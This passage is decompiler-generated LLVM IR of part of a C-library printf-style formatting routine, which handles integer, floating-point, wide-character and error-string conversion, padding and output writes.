  %v2_13708 = icmp eq i32 %v1_13708, 0
  %.175 = select i1 %v2_13708, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_13714 = and i32 %v0_13714, 64
  %v2_13714 = icmp eq i32 %v1_13714, 0
  br i1 %v2_13714, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_13704
  %.176 = select i1 %v2_13708, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_13704, %bb138
  br i1 %v3_13720, label %.thread84, label %dec_label_pc_13728

.thread84:                                        ; preds = %bb139
  %v5_13720 = sub nsw i32 0, %v4_136f4
  store i32 %v5_13720, i32* @r4, align 4
  br label %dec_label_pc_13740

dec_label_pc_13728:                               ; preds = %bb139
  br i1 %v7_13808, label %bb140, label %dec_label_pc_13734

bb140:                                            ; preds = %dec_label_pc_13728
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_13740

dec_label_pc_13734:                               ; preds = %dec_label_pc_13728
  br i1 %v7_13754, label %dec_label_pc_13744, label %dec_label_pc_13740

dec_label_pc_13740:                               ; preds = %.thread84, %bb140, %dec_label_pc_13734
  %v0_1376c86 = phi i32 [ %v5_13720, %.thread84 ], [ %v4_136f4, %bb140 ], [ %v4_136f4, %dec_label_pc_13734 ]
  br label %dec_label_pc_13744

dec_label_pc_13744:                               ; preds = %dec_label_pc_13734, %dec_label_pc_13740
  %v0_1376c85 = phi i32 [ %v0_1376c86, %dec_label_pc_13740 ], [ %v4_136f4, %dec_label_pc_13734 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_13740 ], [ 6, %dec_label_pc_13734 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_13744 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_13744, i32* %r3.global-to-local, align 4
  %v1_13748 = icmp slt i32 %v3_13744, 0
  %v7_1374c. = select i1 %v1_13748, i32 %v7_1374c, i32 32
  store i32 %v7_1374c., i32* @sb, align 4
  br i1 %v7_13754, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_13744
  store i32 %v2_136a0, i32* @lr, align 4
  %v2_1375c = load i32, i32* %ip.global-to-local, align 4
  %v5_1375c = mul i32 %v2_1375c, 4
  %v6_1375c = add i32 %v5_1375c, %v2_136a0
  store i32 %v6_1375c, i32* %r3.global-to-local, align 4
  %v2_13760 = add i32 %v6_1375c, -260
  %v3_13760 = inttoptr i32 %v2_13760 to i32*
  %v4_13760 = load i32, i32* %v3_13760, align 4
  store i32 %v4_13760, i32* %r3.global-to-local, align 4
  %v2_13768 = and i32 %v4_13760, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_13744, %.thread16
  %storemerge94 = phi i32 [ %v2_13768, %.thread16 ], [ 1024, %dec_label_pc_13744 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_1376c85, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_13774 = call i32 @_load_inttype()
  %v0_13778 = load i32, i32* @r1, align 4
  store i32 %v0_13778, i32* %r2.global-to-local, align 4
  %v0_13784 = load i32, i32* @r4, align 4
  store i32 %v0_13784, i32* %r3.global-to-local, align 4
  store i32 %v2_13788, i32* %r0.global-to-local, align 4
  %v0_1378c = load i32, i32* @r5, align 4
  %v6_13790 = call i32 @_uintmaxtostr(i8* %v5_13790, i32 %v0_13774, i32 %v0_13778, i32 %v0_13784, i32 %v0_1378c)
  store i32 %v6_13790, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_13790, i32* @r6, align 4
  br i1 %v3_137a0, label %bb148, label %dec_label_pc_137a4

dec_label_pc_137a4:                               ; preds = %bb145
  %v7_13790 = inttoptr i32 %v6_13790 to i8*
  %v3_137a4 = load i8, i8* %v7_13790, align 1
  %v7_137a8 = icmp eq i8 %v3_137a4, 45
  %v2_137b0 = or i32 %v0_13714, 2
  %v2_137b0.stack_var_-316.4 = select i1 %v7_137a8, i32 %v2_137b0, i32 %v0_13714
  store i32 %v2_137b0.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_137a8, label %.thread18, label %dec_label_pc_137c4

.thread18:                                        ; preds = %dec_label_pc_137a4
  %v3_137b4 = add i32 %v6_13790, 1
  store i32 %v3_137b4, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_137c4:                               ; preds = %dec_label_pc_137a4
  %v1_137c4 = and i32 %v2_137b0.stack_var_-316.4, 2
  %v2_137c4 = icmp eq i32 %v1_137c4, 0
  br i1 %v2_137c4, label %dec_label_pc_137d0, label %bb146

bb146:                                            ; preds = %dec_label_pc_137c4
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_137d0:                               ; preds = %dec_label_pc_137c4
  %v1_137d0 = urem i32 %v2_137b0.stack_var_-316.4, 2
  %v2_137d0 = icmp eq i32 %v1_137d0, 0
  br i1 %v2_137d0, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_137d0
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_137d0, %bb147
  %v0_1382c = phi i32 [ %v6_13790, %bb145 ], [ %v3_137b4, %.thread18 ], [ %v6_13790, %dec_label_pc_137d0 ], [ %v6_13790, %bb147 ], [ %v6_13790, %bb146 ]
  %v0_137e8 = phi i32 [ %v0_13714, %bb145 ], [ %v2_137b0, %.thread18 ], [ %v0_13714, %dec_label_pc_137d0 ], [ %v0_13714, %bb147 ], [ %v0_13714, %bb146 ]
  %v3_137d8 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_137d8, i32* %r2.global-to-local, align 4
  store i32 %v0_137e8, i32* %r3.global-to-local, align 4
  %v1_137e0 = icmp slt i32 %v3_137d8, 0
  br i1 %v1_137e0, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_13810 = phi i32 [ %v3_137d8, %bb148 ], [ 1, %bb149 ]
  %v1_137e8 = and i32 %v0_137e8, 16
  %v2_137e8 = icmp eq i32 %v1_137e8, 0
  store i32 %v2_139bc, i32* %r3.global-to-local, align 4
  %v2_137f0 = sub i32 %v2_139bc, %v0_1382c
  %v1_137f4 = add i32 %v2_137f0, 127
  store i32 %v1_137f4, i32* @r5, align 4
  br i1 %v2_137e8, label %bb157, label %dec_label_pc_137fc

dec_label_pc_137fc:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_137fc
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_137fc, %bb151
  br i1 %v7_13808, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_13810, %v1_137f4
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_13814, label %dec_label_pc_1381c, label %bb157

dec_label_pc_1381c:                               ; preds = %bb155
  %v1_1381c = inttoptr i32 %v0_1382c to i8*
  %v2_1381c = load i8, i8* %v1_1381c, align 1
  %v3_1381c = zext i8 %v2_1381c to i32
  store i32 %v3_1381c, i32* %r3.global-to-local, align 4
  %v7_13820 = icmp eq i8 %v2_1381c, 48
  br i1 %v7_13820, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_1381c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_1381c
  %v2_13828 = add i32 %v2_137f0, 128
  store i32 %v2_13828, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_13864 = phi i32 [ %v0_13810, %bb155 ], [ %v0_13810, %bb150 ], [ 1, %bb156 ], [ %v2_13828, %.thread25 ], [ %v0_13810, %bb154 ]
  %v1_1382c = inttoptr i32 %v0_1382c to i8*
  %v2_1382c = load i8, i8* %v1_1382c, align 1
  %v3_1382c = zext i8 %v2_1382c to i32
  store i32 %v3_1382c, i32* %r3.global-to-local, align 4
  %v7_13830 = icmp eq i8 %v2_1382c, 48
  br i1 %v7_13830, label %dec_label_pc_13838, label %dec_label_pc_13860

dec_label_pc_13838:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_1383c = load i32, i32* @r7, align 4
  %v7_13840 = icmp slt i32 %v0_1383c, 6
  br i1 %v7_13840, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_13838
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_13838, %bb158
  br i1 %v7_13754, label %.thread26, label %dec_label_pc_13854

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1cc58.868 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_139d4

dec_label_pc_13854:                               ; preds = %bb159
  %v2_13854 = icmp eq i32 %v5_13864, 0
  br i1 %v2_13854, label %bb160, label %dec_label_pc_13860

bb160:                                            ; preds = %dec_label_pc_13854
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_139d4

dec_label_pc_13860:                               ; preds = %dec_label_pc_13854, %bb157
  %v2_13860 = sub i32 %v5_13864, %v1_137f4
  %tmp199 = icmp ugt i32 %v5_13864, %v1_137f4
  br i1 %tmp199, label %.thread90, label %dec_label_pc_139d4

.thread90:                                        ; preds = %dec_label_pc_13860
  store i32 %v2_13860, i32* @r4, align 4
  br label %dec_label_pc_139f0thread-pre-split

dec_label_pc_13870:                               ; preds = %dec_label_pc_136e4
  br i1 %tmp196, label %dec_label_pc_138ac, label %dec_label_pc_13878

dec_label_pc_13878:                               ; preds = %dec_label_pc_13870
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_13884 = load i32, i32* @fp, align 4
  store i32 %v0_13884, i32* %r0.global-to-local, align 4
  %v2_13888 = load i32, i32* %v1_136cc, align 4
  %v5_13888 = load i32, i32* %v4_13888, align 4
  store i32 %v5_13888, i32* %r2.global-to-local, align 4
  store i32 %v2_1388c, i32* %r3.global-to-local, align 4
  %v6_13890 = call i32 @_fpmaxtostr(i32 %v0_13884, i32 %v2_13888, i32 %v5_13888, i32* nonnull %stack_var_-328, i32 79088)
  store i32 %v6_13890, i32* %r0.global-to-local, align 4
  %v1_13894 = icmp slt i32 %v6_13890, 0
  br i1 %v1_13894, label %dec_label_pc_13b40, label %dec_label_pc_1389c

dec_label_pc_1389c:                               ; preds = %dec_label_pc_13878
  %v2_138a0 = add i32 %v6_13890, %stack_var_-336.2
  store i32 %v2_138a0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13b2c

dec_label_pc_138ac:                               ; preds = %dec_label_pc_13870
  br i1 %v3_138b0, label %dec_label_pc_1394c, label %dec_label_pc_138b4

dec_label_pc_138b4:                               ; preds = %dec_label_pc_138ac
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_138ac, label %dec_label_pc_138c4, label %dec_label_pc_13914

dec_label_pc_138c4:                               ; preds = %dec_label_pc_138b4
  %v2_138c4 = load i32, i32* %v1_136cc, align 4
  store i32 %v2_138c4, i32* %r3.global-to-local, align 4
  %v9_138c8 = icmp eq i32 %v2_138c4, 0
  store i32 %v2_138c4, i32* %stack_var_-44, align 4
  br i1 %v9_138c8, label %dec_label_pc_139dc, label %dec_label_pc_138d4

dec_label_pc_138d4:                               ; preds = %dec_label_pc_138c4
  %v3_138d4 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_138d4, i32* %r3.global-to-local, align 4
  store i32 %v2_138d8, i32* @r0, align 4
  %v5_138e4 = icmp slt i32 %v3_138d4, -1
  br i1 %v5_138e4, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_138d4
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_138d4, %bb161
  %storemerge193 = phi i32 [ %v3_138d4, %bb161 ], [ -1, %dec_label_pc_138d4 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_138d8, i32* @r1, align 4
  store i32 %v2_138ec, i32* %r3.global-to-local, align 4
  %v0_138f0 = call i32 @__GI_wcsrtombs()
  store i32 %v0_138f0, i32* %r0.global-to-local, align 4
  %v7_138f4 = icmp eq i32 %v0_138f0, -1
  store i32 %v0_138f0, i32* @r5, align 4
  br i1 %v7_138f4, label %dec_label_pc_13b40, label %dec_label_pc_13900

dec_label_pc_13900:                               ; preds = %bb162
  %v0_13900 = load i32, i32* @sl, align 4
  store i32 %v0_13900, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_13900, i32* @r6, align 4
  br label %dec_label_pc_139f0

dec_label_pc_13914:                               ; preds = %dec_label_pc_138b4
  store i32 %v2_139bc, i32* %r8.global-to-local, align 4
  %v2_13918 = load i32, i32* %v1_136cc, align 4
  store i32 %v2_138ec, i32* %r2.global-to-local, align 4
  store i32 %v2_139bc, i32* %r0.global-to-local, align 4
  %v3_13924 = call i32 @__GI_wcrtomb(i32 %v2_139bc, i32 %v2_13918, i32 %v2_138ec)
  store i32 %v3_13924, i32* %r0.global-to-local, align 4
  %v7_13928 = icmp eq i32 %v3_13924, -1
  store i32 %v3_13924, i32* @r5, align 4
  br i1 %v7_13928, label %dec_label_pc_13b40, label %dec_label_pc_13934

dec_label_pc_13934:                               ; preds = %dec_label_pc_13914
  %v0_13934 = load i32, i32* @sl, align 4
  store i32 %v0_13934, i32* @r4, align 4
  store i32 %v2_139bc, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_13944 = trunc i32 %v0_13934 to i8
  %v2_13944 = load i32, i32* %r8.global-to-local, align 4
  %v4_13944 = add i32 %v2_13944, %v3_13924
  %v5_13944 = inttoptr i32 %v4_13944 to i8*
  store i8 %v1_13944, i8* %v5_13944, align 1
  %v0_139f4.pre.pre = load i32, i32* @r5, align 4
  %v1_139f4.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_139f0thread-pre-split

dec_label_pc_1394c:                               ; preds = %dec_label_pc_138ac
  br i1 %v3_13950, label %dec_label_pc_139b0, label %dec_label_pc_13954

dec_label_pc_13954:                               ; preds = %dec_label_pc_1394c
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_1395c = load i32, i32* %v1_136cc, align 4
  br i1 %v7_1394c, label %dec_label_pc_1395c, label %dec_label_pc_13988

dec_label_pc_1395c:                               ; preds = %dec_label_pc_13954
  store i32 %v2_1395c, i32* @r6, align 4
  %v2_13960 = icmp eq i32 %v2_1395c, 0
  br i1 %v2_13960, label %dec_label_pc_139dc, label %dec_label_pc_13968

dec_label_pc_13968:                               ; preds = %dec_label_pc_1395c, %dec_label_pc_139b8
  %v0_13978 = phi i32 [ %v2_1395c, %dec_label_pc_1395c ], [ %v3_139c8, %dec_label_pc_139b8 ]
  %v3_13968 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_13968, i32* %r3.global-to-local, align 4
  %v5_13974 = icmp slt i32 %v3_13968, -1
  br i1 %v5_13974, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_13968
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_13968, %bb163
  %storemerge194 = phi i32 [ %v3_13968, %bb163 ], [ -1, %dec_label_pc_13968 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_13978, i32* %r0.global-to-local, align 4
  %v1_1397c = inttoptr i32 %v0_13978 to i8*
  %v2_1397c = call i32 @strnlen(i8* %v1_1397c)
  store i32 %v2_1397c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_139e4

dec_label_pc_13988:                               ; preds = %dec_label_pc_13954
  store i32 %v2_1395c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_139bc, i32* @r6, align 4
  store i32 %v2_1395c, i32* %stack_var_-180, align 4
  br label %dec_label_pc_139f0thread-pre-split

dec_label_pc_139b0:                               ; preds = %dec_label_pc_1394c
  br i1 %v7_139b0, label %dec_label_pc_139b8, label %dec_label_pc_13b40

dec_label_pc_139b8:                               ; preds = %dec_label_pc_139b0
  %v0_139b8 = call i32 @__errno_location()
  store i32 %v0_139b8, i32* %r0.global-to-local, align 4
  %v1_139c0 = inttoptr i32 %v0_139b8 to i32*
  %v2_139c0 = load i32, i32* %v1_139c0, align 4
  store i32 %v2_139c0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_139c8 = call i32 @__GI___glibc_strerror_r(i32 %v2_139c0, i32 %v2_139bc, i32 128)
  store i32 %v3_139c8, i32* %r0.global-to-local, align 4
  store i32 %v3_139c8, i32* @r6, align 4
  br label %dec_label_pc_13968

dec_label_pc_139d4:                               ; preds = %dec_label_pc_13860, %.thread26, %bb160
  %v0_139f4.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_137f4, %dec_label_pc_13860 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_139f0thread-pre-split

dec_label_pc_139dc:                               ; preds = %dec_label_pc_1395c, %dec_label_pc_138c4
  store i32 ptrtoint ([7 x i8]* @global_var_1cc60.871 to i32), i32* @r6, align 4
  br label %dec_label_pc_139e4

dec_label_pc_139e4:                               ; preds = %bb164, %dec_label_pc_139dc
  %storemerge = phi i32 [ 6, %dec_label_pc_139dc ], [ %v2_1397c, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_139f0

dec_label_pc_139f0thread-pre-split:               ; preds = %.thread90, %dec_label_pc_13934, %dec_label_pc_13988, %dec_label_pc_139d4
  %v1_139f4.pre = phi i32 [ 0, %dec_label_pc_139d4 ], [ %v1_139f4.pre.pre, %dec_label_pc_13934 ], [ 0, %dec_label_pc_13988 ], [ %v2_13860, %.thread90 ]
  %v0_139f4.pre = phi i32 [ %v0_139f4.pre81, %dec_label_pc_139d4 ], [ %v0_139f4.pre.pre, %dec_label_pc_13934 ], [ 1, %dec_label_pc_13988 ], [ %v1_137f4, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_137e8, %dec_label_pc_139d4 ], [ %v0_13714, %dec_label_pc_13934 ], [ %v0_13714, %dec_label_pc_13988 ], [ %v0_137e8, %.thread90 ]
  %v0_139f0.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_139f0

dec_label_pc_139f0:                               ; preds = %dec_label_pc_139f0thread-pre-split, %dec_label_pc_13900, %dec_label_pc_139e4
  %v1_13a30 = phi i32 [ %v1_139f4.pre, %dec_label_pc_139f0thread-pre-split ], [ %v0_13900, %dec_label_pc_13900 ], [ 0, %dec_label_pc_139e4 ]
  %v0_139f4 = phi i32 [ %v0_139f4.pre, %dec_label_pc_139f0thread-pre-split ], [ %v0_138f0, %dec_label_pc_13900 ], [ %storemerge, %dec_label_pc_139e4 ]
  %v0_139fc = phi i32 [ %v0_139f0.pr, %dec_label_pc_139f0thread-pre-split ], [ 11, %dec_label_pc_13900 ], [ 11, %dec_label_pc_139e4 ]
  %v0_13a38 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_139f0thread-pre-split ], [ %v0_13714, %dec_label_pc_13900 ], [ %v0_13714, %dec_label_pc_139e4 ]
  %v7_139f0 = icmp eq i32 %v0_139fc, 11
  %v2_139f4 = add i32 %v0_139f4, %v1_13a30
  br i1 %v7_139f0, label %dec_label_pc_13a0c, label %bb165

bb165:                                            ; preds = %dec_label_pc_139f0
  %v7_13a04 = icmp sgt i32 %v0_139fc, 5
  %. = select i1 %v7_13a04, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_13a08 = add i32 %., %v2_139f4
  br label %dec_label_pc_13a0c

dec_label_pc_13a0c:                               ; preds = %dec_label_pc_139f0, %bb165
  %v0_13a20 = phi i32 [ %v2_139f4, %dec_label_pc_139f0 ], [ %v2_13a08, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_13a10 = sub i32 %tmp97, %v0_13a20
  %v3_13a10 = icmp uge i32 %tmp97, %v0_13a20
  %v9_13a10 = icmp eq i32 %tmp97, %v0_13a20
  %v2_13a14 = xor i1 %v3_13a10, true
  %v3_13a14 = or i1 %v9_13a10, %v2_13a14
  br i1 %v3_13a14, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_13a0c
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_13a0c, %bb166
  %v2_13a18 = xor i1 %v9_13a10, true
  %v3_13a18 = and i1 %v3_13a10, %v2_13a18
  br i1 %v3_13a18, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_13a20.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_13a10, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_13a30 = phi i32 [ %v1_13a20.pre, %._crit_edge ], [ %v2_13a10, %bb168 ]
  %v2_13a20 = add i32 %v0_13a20, %stack_var_-336.2
  %v2_13a24 = add i32 %v2_13a20, %v2_13a30
  store i32 %v2_13a24, i32* %ip.global-to-local, align 4
  store i32 %v0_13a38, i32* %r3.global-to-local, align 4
  %v0_13a2c = load i32, i32* @sb, align 4
  %v7_13a2c = icmp eq i32 %v0_13a2c, 48
  br i1 %v7_13a2c, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_13a30 = add i32 %v2_13a30, %v1_13a30
  store i32 %v3_13a30, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_13a4c = phi i32 [ %v2_13a30, %bb169 ], [ 0, %bb170 ]
  %v1_13a38 = and i32 %v0_13a38, 8
  store i32 %v1_13a38, i32* @r8, align 4
  %v2_13a38 = icmp eq i32 %v1_13a38, 0
  br i1 %v2_13a38, label %dec_label_pc_13a44, label %dec_label_pc_13a60

dec_label_pc_13a44:                               ; preds = %.thread29
  %v0_13a44 = load i32, i32* @fp, align 4
  store i32 %v0_13a44, i32* %r0.global-to-local, align 4
  store i32 %v0_13a4c, i32* %r2.global-to-local, align 4
  %v4_13a50 = call i32 @_charpad(i32 %v0_13a44, i8 32, i32 %v0_13a4c)
  store i32 %v4_13a50, i32* %r0.global-to-local, align 4
  %v1_13a54 = load i32, i32* @sl, align 4
  %v9_13a54 = icmp eq i32 %v4_13a50, %v1_13a54
  br i1 %v9_13a54, label %dec_label_pc_13a5c, label %dec_label_pc_13b40

dec_label_pc_13a5c:                               ; preds = %dec_label_pc_13a44
  %v0_13a5c = load i32, i32* @r8, align 4
  store i32 %v0_13a5c, i32* @sl, align 4
  %v0_13a68.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13a60

dec_label_pc_13a60:                               ; preds = %.thread29, %dec_label_pc_13a5c
  %v0_13a68 = phi i32 [ %v0_139fc, %.thread29 ], [ %v0_13a68.pre, %dec_label_pc_13a5c ]
  %v0_13a64 = load i32, i32* @fp, align 4
  %v2_13a68 = add i32 %v0_13a68, ptrtoint (i32* @global_var_1cc68.873 to i32)
  store i32 %v2_13a68, i32* %r0.global-to-local, align 4
  %v2_13a6c = inttoptr i32 %v2_13a68 to i8*
  %v3_13a6c = call i32 @__GI_fputs_unlocked(i8* %v2_13a6c, i32 %v0_13a64)
  %v0_13a70 = load i32, i32* @fp, align 4
  store i32 %v0_13a70, i32* %r0.global-to-local, align 4
  %v0_13a78 = load i32, i32* @r4, align 4
  store i32 %v0_13a78, i32* %r2.global-to-local, align 4
  %v4_13a7c = call i32 @_charpad(i32 %v0_13a70, i8 48, i32 %v0_13a78)
  store i32 %v4_13a7c, i32* %r0.global-to-local, align 4
  %v1_13a80 = load i32, i32* @r4, align 4
  %v9_13a80 = icmp eq i32 %v4_13a7c, %v1_13a80
  br i1 %v9_13a80, label %dec_label_pc_13a88, label %dec_label_pc_13b40

dec_label_pc_13a88:                               ; preds = %dec_label_pc_13a60
  %v3_13a88 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_13a88, i32* %r3.global-to-local, align 4
  %v2_13a8c = icmp eq i32 %v3_13a88, 0
  br i1 %v2_13a8c, label %dec_label_pc_13a9c, label %dec_label_pc_13afcthread-pre-split

dec_label_pc_13a9c:                               ; preds = %dec_label_pc_13a88
  %v0_13a9c = load i32, i32* @r5, align 4
  %v2_13a9c = icmp eq i32 %v0_13a9c, 0
  br i1 %v2_13a9c, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_13a9c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_13a9c
  %v1_13aa4 = load i32, i32* @r6, align 4
  store i32 %v1_13aa4, i32* %r0.global-to-local, align 4
  %v1_13aac = load i32, i32* @fp, align 4
  store i32 %v1_13aac, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 80564, i32* @lr, align 4
  %v1_13ab0 = xor i1 %v2_13a9c, true
  call void @__pseudo_cond_branch(i1 %v1_13ab0, i32 ptrtoint (i32* @global_var_172a4.864 to i32))
  %v0_13ab4 = load i32, i32* %r0.global-to-local, align 4
  %v1_13ab4 = load i32, i32* @r5, align 4
  %v9_13ab4 = icmp eq i32 %v0_13ab4, %v1_13ab4
  br i1 %v9_13ab4, label %dec_label_pc_13b14, label %dec_label_pc_13b40

dec_label_pc_13ac0:                               ; preds = %dec_label_pc_13afc
  %v2_13ac0 = icmp ult i32 %v1_13ac4, 128
  %.v1_13ac4 = select i1 %v2_13ac0, i32 %v1_13ac4, i32 128
  store i32 %.v1_13ac4, i32* @r2, align 4
  %v0_13acc = call i32 @__GI_wcsrtombs()
  store i32 %v0_13acc, i32* @r4, align 4
  %v2_13ad0 = icmp eq i32 %v0_13acc, 0
  store i32 %v0_13acc, i32* %r3.global-to-local, align 4
  store i32 %v2_139bc, i32* %r0.global-to-local, align 4
  %v0_13ae0 = load i32, i32* @fp, align 4
  store i32 %v0_13ae0, i32* %r2.global-to-local, align 4
  br i1 %v2_13ad0, label %dec_label_pc_13af0, label %dec_label_pc_13ae8

dec_label_pc_13ae8:                               ; preds = %dec_label_pc_13ac0
  %v3_13ae8 = call i32 @__stdio_fwrite(i32 %v2_139bc, i32 %v0_13acc, i32 %v0_13ae0)
  store i32 %v3_13ae8, i32* %r0.global-to-local, align 4
  store i32 %v3_13ae8, i32* %r3.global-to-local, align 4
  %v1_13af0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13af0

dec_label_pc_13af0:                               ; preds = %dec_label_pc_13ac0, %dec_label_pc_13ae8
  %v1_13af0 = phi i32 [ 0, %dec_label_pc_13ac0 ], [ %v1_13af0.pre, %dec_label_pc_13ae8 ]
  %v0_13af4 = phi i32 [ 0, %dec_label_pc_13ac0 ], [ %v3_13ae8, %dec_label_pc_13ae8 ]
  %v9_13af0 = icmp eq i32 %v0_13af4, %v1_13af0
  %v1_13af4 = load i32, i32* @r5, align 4
  %v2_13af4 = sub i32 %v1_13af4, %v0_13af4
  store i32 %v2_13af4, i32* @r5, align 4
  br i1 %v9_13af0, label %dec_label_pc_13afc, label %dec_label_pc_13b40

dec_label_pc_13afcthread-pre-split:               ; preds = %dec_label_pc_13a88
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_13b00.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_13afc

dec_label_pc_13afc:                               ; preds = %dec_label_pc_13afcthread-pre-split, %dec_label_pc_13af0
  %v1_13ac4 = phi i32 [ %v0_13b00.pr, %dec_label_pc_13afcthread-pre-split ], [ %v2_13af4, %dec_label_pc_13af0 ]
  store i32 %v2_139bc, i32* @r6, align 4
  %v2_13b00 = icmp eq i32 %v1_13ac4, 0
  store i32 %v2_138d8, i32* @r1, align 4
  store i32 %v2_138ec, i32* %r3.global-to-local, align 4
  store i32 %v2_139bc, i32* @r0, align 4
  br i1 %v2_13b00, label %dec_label_pc_13b14, label %dec_label_pc_13ac0

dec_label_pc_13b14:                               ; preds = %dec_label_pc_13afc, %.thread36
  %v0_13b14 = load i32, i32* @fp, align 4
  store i32 %v0_13b14, i32* %r0.global-to-local, align 4
  %v0_13b1c = load i32, i32* @sl, align 4
  store i32 %v0_13b1c, i32* %r2.global-to-local, align 4
  %v4_13b20 = call i32 @_charpad(i32 %v0_13b14, i8 32, i32 %v0_13b1c)
  store i32 %v4_13b20, i32* %r0.global-to-local, align 4
  %v1_13b24 = load i32, i32* @sl, align 4
  %v9_13b24 = icmp eq i32 %v4_13b20, %v1_13b24
  br i1 %v9_13b24, label %dec_label_pc_13b2c, label %dec_label_pc_13b40

dec_label_pc_13b2c:                               ; preds = %dec_label_pc_13b14, %dec_label_pc_1389c, %dec_label_pc_136c0
  %stack_var_-316.3 = phi i32 [ %v0_13714, %dec_label_pc_136c0 ], [ %v0_13a38, %dec_label_pc_13b14 ], [ %v0_13714, %dec_label_pc_1389c ]
